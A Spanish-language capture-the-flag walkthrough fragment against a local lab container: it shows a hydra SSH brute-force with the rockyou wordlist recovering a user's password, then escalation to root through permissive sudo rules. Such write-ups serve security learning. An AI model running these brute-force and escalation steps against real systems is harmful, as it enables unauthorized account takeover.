![[Pasted image 20250515090038.png]]

Parece el nombre de un usuario del sistema, voy a ver si por hydra y rockyou le saco la contraseña.

```bash
┌──(root㉿38095a406ad0)-[/]
└─# hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-15 07:09:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-15 07:09:52
```

```bash
┌──(root㉿38095a406ad0)-[/]
└─# ssh tails@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' cant be established.
ED25519 key fingerprint is SHA256:vVwna5nZRCyYSIsc1524JC6VpZ1YBLO+/wBCEPaIIeU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
tails@172.17.0.2s password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.14.5-300.fc42.x86_64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
tails@0b36c298bb6c:~$ sudo -l
User tails may run the following commands on 0b36c298bb6c:
    (sonic) NOPASSWD: ALL
tails@0b36c298bb6c:~$ sudo -u sonic /bin/bash
sonic@0b36c298bb6c:/home/tails$ sudo -l 
User sonic may run the following commands on 0b36c298bb6c:
    (ALL) NOPASSWD: ALL
sonic@0b36c298bb6c:/home/tails$ sudo su
root@0b36c298bb6c:/home/tails# whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
0b36c298bb6c
root@0b36c298bb6c:/home/tails# 
```

De primeras pone que el usuario sonic puede ejecutar cualquier binario, con lo que iniciamos con ese usuario haciendo una bash y despues vemos que podemos hacer sudo su sin contraseña, con lo que lo ejecutamos y realizamos la escalada de privilegios. 